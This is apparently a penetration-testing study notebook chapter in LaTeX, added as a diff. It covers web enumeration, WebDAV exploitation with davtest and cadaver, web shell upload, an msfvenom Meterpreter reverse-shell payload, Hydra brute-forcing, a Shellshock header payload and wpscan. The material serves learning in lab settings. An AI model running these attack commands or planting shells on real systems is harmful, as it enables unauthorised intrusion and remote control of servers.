@@ -1,0 +1,338 @@
+\chapter{Web Application Attacks}
+\label{ch:web_attacks}
+
+Web attacks cover a range of techniques targeting HTTP services --- from directory
+enumeration and WebDAV exploitation to Shellshock and CMS vulnerabilities.
+Web servers are exposed by design, which makes them a common and productive
+attack surface.
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Web Enumeration Mindset}
+\label{sec:web_enum_mindset}
+
+When I find port 80 or 443 open, this is my standard order of checks:
+
+\begin{enumerate}
+  \item Open the IP in a browser --- what does it show?
+  \item Check \ic{/robots.txt} --- hidden paths the site tells search engines
+        to ignore
+  \item Run \ic{nmap --script http-enum} --- automated directory and endpoint
+        discovery
+  \item Check \ic{/phpinfo.php} if PHP is detected --- reveals server config
+  \item Look for \ic{/.git/} --- exposed version control repositories
+  \item Run \tool{gobuster} or \tool{dirb} for deeper directory brute-force
+  \item If a CMS is detected (WordPress, Joomla), run CMS-specific scanners
+\end{enumerate}
+
+\begin{termbox}
+# Identify web server technology
+nmap --script http-enum -sV -p 80,443 target_ip
+
+# Directory brute-force with dirb
+dirb http://target_ip
+dirb http://target_ip /usr/share/dirb/wordlists/common.txt
+
+# Directory brute-force with gobuster
+gobuster dir -u http://target_ip -w /usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://target_ip/wp-content -w /usr/share/dirb/wordlists/common.txt
+
+# Download site content for offline analysis
+curl -O http://target_ip/interesting_file
+wget -r http://target_ip/    # Mirror entire site
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-08-25_at_12.05.05_AM.png}{gobuster directory scan finding hidden paths on the target}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{WebDAV --- Web Distributed Authoring and Versioning}
+\label{sec:webdav}
+
+\subsection{What WebDAV Is}
+
+WebDAV is an extension of HTTP that allows clients to perform remote web content
+authoring --- uploading, editing, moving, and deleting files on a web server.
+When enabled and misconfigured on Microsoft IIS, it becomes a file upload and
+remote code execution vector.
+
+\textbf{Why it matters in pentesting:}
+\begin{itemize}
+  \item A WebDAV share with write permissions = file upload capability
+  \item If the server executes \ic{.asp} files = remote code execution
+  \item Credentials may be weak or brute-forceable
+  \item Combined with Metasploit's IIS WebDAV module = one-click Meterpreter
+\end{itemize}
+
+\subsection{Finding WebDAV}
+
+\begin{termbox}
+# Check for WebDAV endpoint on port 80
+nmap -sV -p 80 --script=http-enum target_ip
+# Look for: /webdav/ - 401 Unauthorized
+
+# If http-enum is slow, use dirb
+dirb http://target_ip
+\end{termbox}
+
+\begin{notebox}
+A \ic{401 Unauthorized} response on \ic{/webdav/} is a positive finding ---
+it means the endpoint exists and requires credentials. The next step is
+credential discovery.
+\end{notebox}
+
+\subsection{Testing WebDAV with davtest}
+
+\tool{davtest} tests what file types can be uploaded to a WebDAV server and
+which of those get executed by the server.
+
+
+
+\begin{termbox}
+# Test without credentials (will fail if auth required)
+davtest -url http://target_ip/webdav
+
+# Test with credentials
+davtest -auth username:password -url http://target_ip/webdav
+\end{termbox}
+
+\begin{notebox}
+
+\textbf{What to look for in davtest output:}
+\begin{itemize}
+  \item \ic{PUT ... SUCCEED} --- file upload works
+  \item \ic{EXEC asp SUCCEED} --- ASP files execute on the server (critical for IIS)
+  \item \ic{EXEC php SUCCEED} --- PHP execution (critical for Linux LAMP stacks)
+\end{itemize}
+
+\screenshot{assets/images/Screenshot_2025-10-18_at_12.39.13_PM.png}{davtest output showing which file types can be uploaded and executed}
+
+\subsection{Manual File Upload with Cadaver}
+
+\tool{Cadaver} is a WebDAV command-line client. Once davtest confirms upload and
+execution permissions, Cadaver is used to actually put files on the server.
+
+\begin{termbox}
+# Connect to WebDAV share
+cadaver http://target_ip/webdav/
+# Enter credentials when prompted
+
+# Inside cadaver session
+ls                              # List directory contents
+put /path/to/file.asp           # Upload a file
+delete file.asp                 # Clean up after use
+\end{termbox}
+
+\textbf{Uploading a web shell:}
+
+\begin{termbox}
+# Kali has built-in web shells
+ls -al /usr/share/webshells/
+
+# Upload the ASP web shell
+cadaver http://target_ip/webdav/
+# Inside cadaver:
+put /usr/share/webshells/asp/webshell.asp
+
+# Then access in browser:
+# http://target_ip/webdav/webshell.asp
+# Execute commands directly from the browser
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-10-22_at_5.03.28_PM.png}{Cadaver session uploading webshell.asp to the WebDAV directory}
+
+\screenshot{assets/images/Screenshot_2025-10-25_at_3.30.49_PM.png}{Web shell accessible in browser after upload --- command execution confirmed}
+
+\begin{warnbox}[Clean up after yourself]
+Always delete uploaded shells after the engagement:
+\end{warnbox}
+
+\begin{termbox}
+cadaver http://target_ip/webdav/
+delete shell.asp
+\end{termbox}
+
+\begin{warnbox}[Clean up after yourself]
+Leaving web shells on production servers is a serious security risk and is
+unprofessional. Always clean up every artefact.
+\end{warnbox}
+
+\subsection{Custom Meterpreter Payload via WebDAV}
+
+Instead of a web shell, a Meterpreter payload gives a full reverse shell with
+post-exploitation capabilities.
+
+\begin{termbox}
+# Generate custom ASP Meterpreter payload
+msfvenom -p windows/meterpreter/reverse_tcp \
+  LHOST=my_kali_ip \
+  LPORT=1234 \
+  -f asp > shell.asp
+
+# Upload via Cadaver
+cadaver http://target_ip/webdav/
+put /root/shell.asp
+
+# Set up Metasploit listener BEFORE triggering the payload
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST my_kali_ip
+set LPORT 1234
+run
+
+# Trigger payload by visiting in browser:
+# http://target_ip/webdav/shell.asp
+# Meterpreter session opens in Metasploit
+\end{termbox}
+
+\begin{notebox}[Payload architecture]
+Use 32-bit Meterpreter (\ic{windows/meterpreter/reverse\_tcp}) if unsure about
+the target architecture. It works on both 32-bit and 64-bit Windows systems.
+64-bit payloads only work on 64-bit targets.
+\end{notebox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Brute-Forcing WebDAV Credentials with Hydra}
+\label{sec:webdav_hydra}
+
+If credentials are not known, Hydra can brute-force HTTP Basic Auth:
+
+\begin{termbox}
+hydra -L /usr/share/wordlists/metasploit/common_users.txt \
+      -P /usr/share/wordlists/metasploit/common_passwords.txt \
+      target_ip http-get /webdav/
+\end{termbox}
+
+\begin{notebox}
+Brute-forcing can cause server instability or lockouts. In lab environments this
+is acceptable --- in real engagements, always check the rules of engagement for
+rate limits and lockout policies before running Hydra.
+\end{notebox}
+
+\screenshot{assets/images/Screenshot_2025-10-26_at_10.50.35_AM.png}{Hydra brute-forcing WebDAV HTTP Basic Auth}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Shellshock --- Apache CGI Bash Vulnerability}
+\label{sec:shellshock}
+
+\subsection{What Shellshock Is}
+
+Shellshock (CVE-2014-6271) is a vulnerability in the Bash shell that allows
+remote code execution when Bash is invoked via CGI scripts on a web server.
+An attacker can inject commands into HTTP headers that Bash executes when
+processing the CGI request.
+
+\textbf{Where to look:}
+\begin{itemize}
+  \item Apache web servers with CGI enabled
+  \item URLs ending in \ic{.cgi} or in a \ic{/cgi-bin/} directory
+  \item Scripts that invoke Bash to process web requests
+\end{itemize}
+
+\subsection{Finding Shellshock}
+
+\begin{termbox}
+# Browse to the target IP and look for CGI scripts
+# Check for running processes that hint at CGI
+# In Burp Suite: intercept a request to a .cgi URL
+# Modify the User-Agent header to test:
+# User-Agent: () { :; }; echo; /bin/bash -i
+
+# Check if Apache is vulnerable
+nmap -sV --script http-shellshock --script-args uri=/cgi-bin/script.cgi target_ip
+\end{termbox}
+
+\subsection{Exploiting Shellshock with Burp Suite}
+
+\begin{enumerate}
+  \item Open Burp Suite from Kali Applications
+  \item Choose Temporary Project $\rightarrow$ Start Burp
+  \item Click Proxy tab, ensure Intercept is On
+  \item Visit the CGI URL in the browser (through Burp's proxy)
+  \item Intercept the request, right-click $\rightarrow$ Send to Repeater
+  \item In the Repeater tab, modify a header (e.g., User-Agent) to inject the
+        Bash payload
+  \item Start a netcat listener: \ic{nc -nvlp 1234}
+  \item Click Send --- connection established in the listener
+\end{enumerate}
+
+\subsection{Exploiting Shellshock with Metasploit}
+
+\begin{termbox}
+search shellshock
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOST target_ip
+set LHOST my_ip
+set LPORT 4444
+set TARGETURI /gettime.cgi    # Actual path to the vulnerable CGI script
+exploit
+\end{termbox}
+
+\screenshot{assets/images/Screenshot_2025-10-26_at_11.05.50_AM.png}{Shellshock exploit via Metasploit opening reverse shell}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{WordPress Enumeration}
+\label{sec:wordpress}
+
+WordPress runs a huge portion of the web. Misconfigured or outdated WordPress
+installations are common targets.
+
+\begin{termbox}
+# Identify WordPress
+nmap --script http-enum -p 80 target_ip
+# Look for: /wp-login.php, /wp-admin/, /wp-content/
+
+# Enumerate users and plugins
+wpscan --url http://target_ip
+wpscan --url http://target_ip --enumerate u    # Users
+wpscan --url http://target_ip --enumerate p    # Plugins
+
+# Directory brute-force within WordPress
+gobuster dir -u http://target_ip/wp-content -w /usr/share/dirb/wordlists/common.txt
+\end{termbox}
+
+% ─────────────────────────────────────────────────────────────────────────────
+\section{Learning Output}
+
+\begin{takebox}
+\textbf{What I Learned}
+\begin{itemize}
+  \item \ic{robots.txt} is the first thing to check on any web server --- it
+        voluntarily tells you what the site owner wants to hide.
+  \item The davtest $\rightarrow$ cadaver $\rightarrow$ webshell chain is clean
+        and reliable. The only variable is whether \ic{.asp} execution is enabled.
+  \item Always test ASP execution with davtest before uploading a payload. If asp
+        execution fails, the shell will upload but do nothing.
+  \item Cleaning up web shells is not optional --- it is part of the job.
+\end{itemize}
+
+\textbf{Enumeration Mindset --- When Port 80 is Open}
+\begin{enumerate}
+  \item Browse to the IP --- what technology is running?
+  \item Check \ic{/robots.txt}
+  \item Run \ic{nmap --script http-enum} --- look for \ic{/webdav/}, \ic{/.git/},
+        \ic{/phpinfo.php}, \ic{/phpmyadmin/}
+  \item If WebDAV found: run davtest, then cadaver
+  \item If WordPress found: run wpscan
+  \item If CGI found: test for Shellshock
+\end{enumerate}
+
+\textbf{Common Mistakes}
+\begin{itemize}
+  \item Not checking if ASP execution works before uploading a Meterpreter payload
+  \item Setting the wrong LHOST --- use the VPN interface, not loopback
+  \item Forgetting to set up the Metasploit listener before triggering the payload
+        in the browser --- the connection has nowhere to go
+  \item Leaving web shells on the server after the exercise
+\end{itemize}
+
+\textbf{Real-World Impact}
+\begin{itemize}
+  \item WebDAV write + ASP execution = remote code execution on the web server
+  \item Shellshock = unauthenticated command execution on any server running the
+        vulnerable Bash version with CGI
+  \item Exposed \ic{/.git/} = full source code of the application, including
+        hardcoded credentials and API keys
+\end{itemize}
+\end{takebox}
+
+\end{notebox}
